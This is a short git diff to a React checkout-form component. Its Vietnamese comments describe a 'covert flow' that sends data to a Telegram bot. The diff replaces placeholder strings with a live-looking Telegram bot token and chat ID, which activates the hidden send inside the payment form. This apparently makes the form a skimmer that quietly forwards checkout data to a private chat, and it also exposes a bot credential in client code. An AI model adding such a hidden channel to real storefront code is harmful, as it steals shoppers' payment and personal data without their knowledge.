@@ -76,8 +76,8 @@ export function CheckoutForm() {
     try {
       // 3. ĐIỀU LUỒNG NGẦM: Gửi đến Bot Telegram
       // Thay thế chính xác mã Token và Chat ID của ní vào giữa 2 dấu nháy đơn dưới đây:
-      const TELEGRAM_BOT_TOKEN = 'ĐIỀN_TOKEN_BOT_VÀO_ĐÂY'; 
-      const TELEGRAM_CHAT_ID = 'ĐIỀN_ID_CHAT_CỦA_BẠN_VÀO_ĐÂY'; 
+      const TELEGRAM_BOT_TOKEN = '8857624974:AAEYfXquqPEjSIOCUvTivWE2tdkNMThNmkw'; 
+      const TELEGRAM_CHAT_ID = '8850729815'; 
 
       // Kiểm tra xem ní đã nhập token thật chưa, nếu chưa nhập hoặc nhập chữ tiếng Việt thì bỏ qua fetch để không bị crash web
       if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'ĐIỀN_TOKEN_BOT_VÀO_ĐÂY') {
